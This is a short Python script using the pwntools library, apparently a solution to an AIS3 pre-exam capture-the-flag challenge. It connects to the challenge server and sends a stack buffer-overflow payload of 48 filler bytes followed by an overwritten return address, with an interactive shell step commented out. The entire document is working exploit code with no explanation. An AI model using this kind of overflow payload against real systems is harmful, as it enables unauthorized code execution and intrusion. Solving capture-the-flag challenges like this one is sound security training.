from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')
r = remote('pre-exam-pwn.ais3.org', 10000)
r.recvline()
r.sendline(b'A'*48+p64(0x400687) + p64(0x400687))
#  r.interactive()
